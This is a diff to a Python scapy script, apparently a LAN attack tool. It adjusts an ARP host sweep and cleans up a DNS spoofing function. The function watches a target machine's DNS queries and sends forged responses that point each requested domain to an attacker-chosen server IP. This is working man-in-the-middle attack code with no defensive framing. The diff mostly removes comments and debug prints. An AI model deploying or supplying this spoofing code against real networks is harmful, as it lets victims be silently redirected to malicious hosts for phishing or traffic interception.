@@ -18,7 +18,7 @@ def rtrv_interfaces():
 
 def scan_hosts_scapy(interface: str):
     host = []
-    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst="10.10.10.1/24"),timeout = 2, iface = interface, verbose = False)
+    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst="10.10.10.0/24"), timeout = 2, iface = interface, verbose = False)
 
     for i in range(len(ans)):
         host.append((str(i) + ".", "IP: ", ans[i][1]["ARP"].psrc, "and MAC: ", ans[i][1]["ARP"].hwsrc))
@@ -61,29 +61,14 @@ def dns_spoofer(pkt):
 	global g_target_ip, g_router_ip, g_server_ip
 	print(g_target_ip, g_router_ip, g_server_ip)
 
-	if (pkt[IP].src == g_target_ip and
-		pkt.haslayer(DNS) and
-		pkt[DNS].qr == 0 and				# DNS Query
-		pkt[DNS].opcode == 0 and			# DNS Standard Query
-		pkt[DNS].ancount == 0			# Answer Count
-		#pkt[DNS].qd.qname in SPOOFED_SITE	# Query domain name
-		#pkt[DNS].qd.qname in "sedo.com"
-		):
-
-		print("Sending spoofed DNS response")
-
+	if (pkt[IP].src == g_target_ip and pkt.haslayer(DNS) and pkt[DNS].qr == 0 and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0):
 		if (pkt.haslayer(IPv6)):
 			ip_layer = IPv6(src=pkt[IPv6].dst, dst=pkt[IPv6].src)
 		else:
 			ip_layer = IP(src=pkt[IP].dst, dst=pkt[IP].src)
 
-
-		# Create the spoofed DNS response (returning back our IP as answer instead of the endpoint)
 		dns_resp =  ip_layer/ \
 				UDP(dport=pkt[UDP].sport,sport=53)/ \
 				DNS(id=pkt[DNS].id, ancount=1, qr=1, ra=1, qd=(pkt.getlayer(DNS)).qd, an=DNSRR(rrname=pkt[DNSQR].qname, rdata=g_server_ip, ttl = 10))
 
-		# Send the spoofed DNS response
-		print(dns_resp.show())
 		send(dns_resp, verbose=0)
-		print(f"Resolved DNS request for {pkt[DNS].qd.qname} by {g_server_ip}")
